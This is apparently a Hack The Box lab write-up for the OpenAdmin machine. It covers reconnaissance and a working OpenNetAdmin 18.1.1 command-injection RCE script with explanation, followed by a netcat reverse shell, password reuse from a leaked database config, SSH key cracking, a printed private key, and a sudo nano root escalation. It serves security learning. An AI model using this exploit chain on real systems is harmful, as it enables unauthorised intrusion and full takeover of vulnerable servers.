![[openadmin_info.png]]

https://app.hackthebox.com/machines/222

IP: 10.129.100.13

nmap revealed ssh on port 22 and a website on port 80.
```sh
❯ sudo nmap -sC -sV -T4 -oA Scans/nmap/openadmin 10.129.100.13
Command executed at: 2025-03-22 13:39:22
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-22 13:39 PDT
Nmap scan report for 10.129.100.13
Host is up (0.078s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.01 seconds
```


---

Subdirectory scan revealed some hidden subdirectories

```sh
❯ ffuf -w ~/MyWordlists/subdirectory/big.txt -u http://10.129.100.13/FUZZ -r
Command executed at: 2025-03-22 13:43:33

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4673ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4674ms]
artwork                 [Status: 200, Size: 14461, Words: 4026, Lines: 372, Duration: 91ms]
music                   [Status: 200, Size: 12554, Words: 764, Lines: 356, Duration: 77ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 84ms]
sierra                  [Status: 200, Size: 43029, Words: 14866, Lines: 589, Duration: 78ms]
:: Progress: [20469/20469] :: Job [1/1] :: 481 req/sec :: Duration: [0:00:56] :: Errors: 0 ::
```

/artwork /music and /sierra

---

Exploring the site, found a link in the source code of /music that led to an OpenNetAdmin dashboard
```html
<div class="user-panel">
				<a href="../ona" class="login">Login</a> <!-- This link takes us to http://10.129.100.13/ona -->
				<a href="" class="register">Create an account</a>
			</div> 
```

![[opennetadmin_dashboard.png]]


The version of OpenNetAdmin this site is using is v18.1.1.

--- 

Gaining RCE.

OpenNetAdmin 18.1.1 improperly sanitizes input passed to its `xajaxargs[]` parameters, allowing **command injection**. The attacker slips in `; <cmd>` within a parameter that eventually gets run in the backend shell.

Using the following exploit, we can gain code execution.

```sh
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

What It Does:

    Takes a URL as the first argument:

URL="${1}"

This should be the target's base URL (e.g., http://targetsite.com/ona/).

Infinite loop to act like a pseudo-shell:

while true; do
    echo -n "$ "; read cmd
    ...
done

    It prompts the user to enter a command (cmd) repeatedly.

Sends the command to the target via a vulnerable parameter:

curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}"

    This POST request injects your command (${cmd}) into a parameter (xajaxargs[]) that ends up getting executed by the server.

    It wraps the command with echo "BEGIN" and echo "END" so it can extract the output cleanly.

Extracts the command output from the response:

| sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1

    sed: Grab everything between BEGIN and END.

    tail/head: Remove the BEGIN/END lines, showing only the command output.



We run the script and gain code execution.
```sh
❯ ./OpenNetAdmin_RCE.sh http://10.129.100.13/ona/
Command executed at: 2025-03-22 14:21:09
$ whoami
www-data
$ hostname
openadmin
```

Uploaded a php reverse shell to get a better shell on the box.

```sh
 nc -lvnp 4444
Command executed at: 2025-03-22 14:31:31
listening on [any] 4444 ...
connect to [10.10.14.89] from (UNKNOWN) [10.129.100.13] 59010
Linux openadmin 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 21:31:52 up 54 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (3175): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/$ 
```

Discovered a database file that contains the credentials for `ona_sys`

```sh
www-data@openadmin:/$ cat /opt/ona/www/local/config/database_settings.inc.php 
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```


Testing password reuse with users on the box, successfully logged in as `jimmy` via ssh

```sh
❯ ssh jimmy@10.129.100.13
Command executed at: 2025-03-22 14:56:40
The authenticity of host '10.129.100.13 (10.129.100.13)' can't be established.
ED25519 key fingerprint is SHA256:wrS/uECrHJqacx68XwnuvI9W+bbKl+rKdSh799gacqo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.100.13' (ED25519) to the list of known hosts.
jimmy@10.129.100.13's password: 

jimmy@openadmin:~$ whoami
jimmy 
```


The site config file mentions an internal website that is running under the user "joanna"
```sh
jimmy@openadmin:/tmp$ cat /etc/apache2/sites-available/internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

Seems to be running on localhost port 52846.

Using port forwarding, we can view the site in our browser.
```sh
❯ ssh -L 8081:127.0.0.1:52846 jimmy@10.129.100.13
Command executed at: 2025-03-22 15:17:11
```


![[internal_login.png]]

index.php shows that it's expecting Jimmy's credentials

```sh
jimmy@openadmin:/tmp$ cat /var/www/internal/index.php
<SNIP>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->
<SNIP>
```

The sha512 encrypted password is different: `Revealed`. 
![[cracked_hash.png]]

Successfully logging in reveals joanna's private ssh key, as mentioned in `main.php`

```sh
jimmy@openadmin:/tmp$ cat /var/www/internal/main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

![[internal_main.png]]

Unfortunately the key is encrypted, but we can use ssh2john to crack it.

```sh
❯ ssh2john joanna.id_rsa.encrypted > joanna.hash
Command executed at: 2025-03-22 15:29:22
❯ john joanna.hash --wordlist=~/MyWordlists/password/rockyou.txt
Command executed at: 2025-03-22 15:29:36
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna.id_rsa.encrypted)     
1g 0:00:00:03 DONE (2025-03-22 15:29) 0.2832g/s 2712Kp/s 2712Kc/s 2712KC/s bloodofademon..bloodmoon007
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The password is `bloodninjas`

Now we can decrypt the key using openssl.

```sh
❯ openssl rsa -in joanna.id_rsa.encrypted -out joanna.id_rsa
Command executed at: 2025-03-22 15:30:37
Enter pass phrase for joanna.id_rsa.encrypted:
writing RSA key
❯ cat joanna.id_rsa
Command executed at: 2025-03-22 15:30:53
-----BEGIN PRIVATE KEY-----
MIIEwAIBADANBgkqhkiG9w0BAQEFAASCBKowggSmAgEAAoIBAQDQq/QYeYL+V+jJ
+LryA/icUJL9zyT72WMo5Bq0THQk2VQ/JaY6KiLJ929clsttUEM4RVY0yBldrvQ3
EEpOrlls2PImRMOwMz7cPnrL11t53OugzwEtFPqO/8yWcqquGO2qp8Jw5xvthIiL
Ug0t2z5CzbLLAGj1EVMCjhgKMR6r6ZOJRK/8M9n1YrOtuFoj+BRMyTNvHur3d1Eu
mnVmfZk2AJeLqrXfxJAJ9hjD+266hlqbYd9GJDP5AfoXhW+fp1Q4sD+yHdr7XOrS
24C2lwrPCrZoTaCPnDj01WuuTY/xCPfJuJcHjsVoZwrm7nSfkTJlS1y7xBqrVZwR
xpCGhnQ/AgMBAAECggEBAIJm4sykqtq9HwmQeWsiViuBIsqft3H3gMMeAR4pJO+e
LMqlgYKZsFHcYehPh+LRJKC2m8+yOD/WRGFgub7/r3yY+oI1uMCU1bSXCu/1rgGy
sEE2+3orwQS6ECT4lXbktylNWvJpSoecqiO+a+P7PaZLm27G29BCOki/eYBs/8jX
tYWZgbDFszTxvRllidUkyxWkEmAPz2QLGZfdsu2RnoEMOqBWDfPIFfZfMg3bqVz4
dgOf9OLtrm3KjQASALGahJbzzD9w2gP1NeNwKAhTF8kdIhlTzOoTX9ZeQiuAuqrA
lftZpYI5GdHkx3IWdfWmq3hrOA9l9rZkUvxvaXD17QkCgYEA/x1HjsZ6kP1gymCq
Jlvss2HtBBpykQdLQsKJ/2pUKBTQcl9GF82k6fJjq0f4dqMxXX+6+8od3ecV1EvD
bftjCtKNC1Py1ulU6IhAcKAW2IfeZ8TzsqfxyVZU7PWYz7ozF6beJ1e0yuAdeNbm
H3ZVm5OfkptgcX+loTgMxaY1N10CgYEA0WVmenAQ4iPDXa1GlsbYvV6njakB4+Me
ECqSvy+e+Xxh0nKA60sy+LSfFTLEVcel+t0LYQG7NMAgBiaTPVuQE3VMqIsEQiET
UUpvyS63JwTj9zyu4cXihLX5EzqHXoY2Wfn2jZdlCgJhOkJNQNbRm1AR1iYtZ0xC
igaVwfKkbEsCgYEAvlgYRfztAjUq/JS3HzvDFexgrYkWJgNtMfh4givRcr5k8JEJ
eUUkYLFLkEZ4qfwFHx/oYWlic2ixrt6AiBTixvZl6ifOrm8VvRG8Esw/f3uQg5g9
w/TuwCw73Tk5tPPWnzUP2Abmi+A/3SNqO9tM8HFqxDZN9SEqcWmije3/ErkCgYEA
y4odSvaT8r2AshY0f2taUvknNXQK+lFSb7RyYJURmsFk9QOIfS7jpQ0tdZWbcyZW
GLu0y9668lOuzUvB4+qU6dUjZtF6mi08cdBBSPW34p3GWhUKiTupLAcWzbIe06ry
OhPXrVp0RH57s/2uylAF/0qdi+QgTkC6jSBJgfUyDnECgYEAgvG8clOKsWLir+Ej
3k8CXV+91g0oKMI/uYfh1xMHqMaMfgV5BAJ091MIa72CGzUkBhk6sJpO1hRnGMr8
UuQYWYFzg7XUfE67M0ffl9vmBY2tRIn8h2ETv6f31xs9S839F4r5+FmurYWamlEg
CZmmIP7LNkp/g/2IgGX6YHm5hMI=
-----END PRIVATE KEY-----
```


Now we can login as joanna.
```sh
❯ ssh -i joanna.id_rsa joanna@10.129.100.13
Command executed at: 2025-03-22 15:31:53
<SNIP>
joanna@openadmin:~$ whoami
joanna
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Got the user flag
```sh
joanna@openadmin:~$ cat user.txt
35b5cf3e96f0fc144837d79d5e95936e
```

Joanna has sudo privileges for `nano`.
Looking at GTFOBins, there's an easy way to execute commands as root if you have Sudo privileges on Nano:
![[gtfobins_nano.png]]

Opening the root owned file `/opt/priv` in nano and using the above commands successfully granted command execution as root.
Got the root flag.
```sh
Command to execute: reset; sh 1>&0 2>&0
# id             
uid=0(root) gid=0(root) groups=0(root)                                                                                
# cat /root/root.txt                                                                                                  
6272d939337c03ad4e5b78068a62d71e
```

![[openadmin_completed.png]]
